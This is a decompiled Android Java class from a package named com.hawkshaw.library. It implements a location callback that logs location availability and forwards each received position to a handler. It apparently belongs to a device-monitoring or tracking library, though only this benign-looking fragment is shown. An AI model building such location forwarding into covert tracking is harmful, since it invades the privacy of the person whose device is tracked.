package com.hawkshaw.library.features.location;

import G0.c;
import Y1.K;
import android.location.Location;
import com.google.android.gms.location.LocationAvailability;
import com.google.android.gms.location.LocationResult;
import com.hawkshaw.library.logger.Logger;
import i3.l;

public final class FusedLocation$locationCallback$1 extends c {
    final /* synthetic */ FusedLocation this$0;

    public FusedLocation$locationCallback$1(FusedLocation fusedLocation) {
        this.this$0 = fusedLocation;
    }

    public void onLocationAvailability(LocationAvailability locationAvailability) {
        K.n(locationAvailability, "availability");
        Logger logger = Logger.INSTANCE;
        boolean z4 = locationAvailability.f4529d < 1000;
        Logger.d$default(logger, "FusedLocation", "isLocationAvailable " + z4, false, 4, (Object) null);
    }

    public void onLocationResult(LocationResult locationResult) {
        K.n(locationResult, "result");
        for (Location location : locationResult.f4547a) {
            l access$getOnLocationReceived$p = this.this$0.onLocationReceived;
            K.k(location);
            access$getOnLocationReceived$p.invoke(location);
        }
    }
}
